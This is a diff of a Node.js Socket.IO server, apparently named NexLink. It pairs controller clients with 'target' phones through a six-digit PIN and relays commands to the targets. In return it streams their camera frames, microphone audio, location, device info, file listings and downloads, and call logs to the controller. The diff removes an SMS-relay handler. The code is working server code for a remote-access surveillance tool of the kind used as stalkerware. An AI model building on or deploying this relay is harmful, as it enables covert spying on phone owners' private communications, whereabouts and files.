@@ -1,3 +1,4 @@
+console.log("🔥 SERVER FILE LOADED");
 const express = require("express");
 const http = require("http");
 const cors = require("cors");
@@ -5,29 +6,35 @@ const { Server } = require("socket.io");
 
 const app = express();
 app.use(cors());
-app.use("/files", express.static("/storage/emulated/0"));
+
+// 🔥 Health check route (IMPORTANT for Render)
+app.get("/", (req, res) => {
+  res.send("NexLink Server Running ✅");
+});
 
 const server = http.createServer(app);
 
 const io = new Server(server, {
-  cors: { origin: "*" },
+  cors: {
+    origin: "*",
+    methods: ["GET", "POST"]
+  },
+  transports: ["websocket", "polling"], // 🔥 IMPORTANT FOR RENDER
   maxHttpBufferSize: 1e8
 });
 
 let devices = {};
 let controllerMap = {};
 
-// 🔐 NEW
-let devicePins = {};          // targetId → PIN
-let verifiedControllers = {}; // controllerId → targetId
+// 🔐 Security (optional but kept)
+let devicePins = {};
+let verifiedControllers = {};
 
 io.on("connection", (socket) => {
 
-  console.log("🟢 Device connected:", socket.id);
+  console.log("🟢 Connected:", socket.id);
 
-  /* -----------------------------
-     REGISTER DEVICE
-  ------------------------------ */
+  /* ================= REGISTER ================= */
   socket.on("register-device", (data) => {
 
     devices[socket.id] = {
@@ -36,15 +43,14 @@ io.on("connection", (socket) => {
       type: data.type,
     };
 
-    console.log("📱 Registered:", devices[socket.id]);
+    console.log("📱 Registered:", data.name, data.type);
 
-    // 🔐 GENERATE PIN FOR TARGET
+    // 🔐 Generate PIN for target
     if (data.type === "target") {
       const pin = Math.floor(100000 + Math.random() * 900000).toString();
-
       devicePins[socket.id] = pin;
 
-      console.log("🔐 PIN for", socket.id, ":", pin);
+      console.log("🔐 PIN:", pin);
 
       io.to(socket.id).emit("device-pin", { pin });
     }
@@ -52,158 +58,127 @@ io.on("connection", (socket) => {
     io.emit("device-list", Object.values(devices));
   });
 
-  /* -----------------------------
-     🔐 VERIFY PIN
-  ------------------------------ */
+  /* ================= VERIFY PIN ================= */
   socket.on("verify-pin", ({ pin }) => {
 
-    const targetEntry = Object.entries(devicePins)
+    const entry = Object.entries(devicePins)
       .find(([id, p]) => p === pin);
 
-    if (!targetEntry) {
-      console.log("❌ Invalid PIN");
+    if (!entry) {
       socket.emit("pin-status", { success: false });
       return;
     }
 
-    const targetId = targetEntry[0];
-
+    const targetId = entry[0];
     verifiedControllers[socket.id] = targetId;
-
-    console.log("✅ Controller verified:", socket.id, "→", targetId);
 
     socket.emit("pin-status", {
       success: true,
-      targetId: targetId
+      targetId
     });
+
+    console.log("✅ Verified:", socket.id);
   });
 
-  /* -----------------------------
-     COMMAND FROM CONTROLLER
-  ------------------------------ */
+  /* ================= COMMAND ================= */
   socket.on("send-command", (data) => {
 
-    const targetId = data.targetId;
+  const targetId = data.targetId;
 
-    console.log("📤 Command from controller:", data);
+  // 🔐 CHECK PIN VERIFICATION
+  const allowedTarget = verifiedControllers[socket.id];
 
-    // 🔐 AUTH CHECK
-    const allowedTarget = verifiedControllers[socket.id];
+  if (allowedTarget !== targetId) {
+    console.log("❌ Not verified controller");
+    return;
+  }
 
-    if (allowedTarget !== targetId) {
-      console.log("❌ Unauthorized command attempt");
-      return;
-    }
+  if (!devices[targetId]) {
+    console.log("❌ Target not found");
+    return;
+  }
 
-    if (devices[targetId]) {
+  controllerMap[targetId] = socket.id;
 
-      controllerMap[targetId] = socket.id;
+  console.log("✅ Command routed:", targetId);
 
-      console.log("🎯 Mapping saved:", targetId, "→", socket.id);
+  io.to(targetId).emit("receive-command", data.command);
+});
+  /* ================= LOCATION ================= */
+  socket.on("location-data", (data) => {
 
-      io.to(targetId).emit("receive-command", data.command);
+    const controller = controllerMap[socket.id];
 
-    } else {
-      console.log("❌ Target NOT FOUND:", targetId);
-    }
-  });
-
-  /* -----------------------------
-     🎤 MIC AUDIO
-  ------------------------------ */
-  socket.on("mic-audio", (data) => {
-
-    console.log("🎤 Mic audio received");
-
-    const controllerSocketId = controllerMap[socket.id];
-
-    if (controllerSocketId) {
-      io.to(controllerSocketId).emit("mic-audio", data);
+    if (controller) {
+      io.to(controller).emit("location-data", data);
     }
   });
 
-  /* -----------------------------
-     FILE MANAGER
-  ------------------------------ */
+  /* ================= DEVICE INFO ================= */
+  socket.on("device-info", (data) => {
+
+    const controller = controllerMap[socket.id];
+
+    if (controller) {
+      io.to(controller).emit("device-info", data);
+    }
+  });
+
+  /* ================= FILES ================= */
   socket.on("file-list", (data) => {
-    io.emit("file-list", data);
+
+    const controller = controllerMap[socket.id];
+
+    if (controller) {
+      io.to(controller).emit("file-list", data);
+    }
   });
 
   socket.on("file-download", (data) => {
-    io.emit("file-download", data);
-  });
 
-  /* -----------------------------
-     LOCATION
-  ------------------------------ */
-  socket.on("location-data", (data) => {
-    io.emit("location-data", data);
-  });
+    const controller = controllerMap[socket.id];
 
-  /* -----------------------------
-     DEVICE INFO
-  ------------------------------ */
-  socket.on("device-info", (data) => {
-    io.emit("device-info", data);
-  });
-
-  /* -----------------------------
-     CALL LOGS
-  ------------------------------ */
-  socket.on("call-logs", (data) => {
-
-    let logs = [];
-
-    try {
-      logs = JSON.parse(data);
-    } catch (e) {
-      console.log("❌ JSON parse error:", e);
-      return;
+    if (controller) {
+      io.to(controller).emit("file-download", data);
     }
-
-    io.emit("call-logs", logs);
   });
 
-  /* -----------------------------
-     CAMERA STREAM
-  ------------------------------ */
+  /* ================= CAMERA ================= */
   socket.on("camera-frame", (data) => {
-    io.emit("camera-frame", data);
-  });
 
-  /* -----------------------------
-     SMS BLOCK
-  ------------------------------ */
-  socket.on("sms-data", (data) => {
+    const controller = controllerMap[socket.id];
 
-    let smsArray = [];
-
-    if (typeof data === "string") {
-      try {
-        smsArray = JSON.parse(data);
-      } catch (e) {
-        console.log("❌ Parse error:", e);
-        return;
-      }
-    } else if (Array.isArray(data)) {
-      smsArray = data;
-    } else {
-      smsArray = [data];
-    }
-
-    const controllerSocketId = controllerMap[socket.id];
-
-    if (controllerSocketId) {
-      io.to(controllerSocketId).emit("sms-data", smsArray);
+    if (controller) {
+      io.to(controller).emit("camera-frame", data);
     }
   });
 
-  /* -----------------------------
-     DISCONNECT
-  ------------------------------ */
+  /* ================= MIC ================= */
+  socket.on("mic-audio", (data) => {
+
+    const controller = controllerMap[socket.id];
+
+    if (controller) {
+      io.to(controller).emit("mic-audio", data);
+    }
+  });
+
+  /* ================= CALL LOGS ================= */
+  socket.on("call-logs", (logs) => {
+
+    console.log("📞 Call logs received:", logs.length);
+
+    const controller = controllerMap[socket.id];
+
+    if (controller) {
+      io.to(controller).emit("call-logs", logs);
+    }
+  });
+
+  /* ================= DISCONNECT ================= */
   socket.on("disconnect", () => {
 
-    console.log("🔴 Device disconnected:", socket.id);
+    console.log("🔴 Disconnected:", socket.id);
 
     delete devices[socket.id];
     delete controllerMap[socket.id];
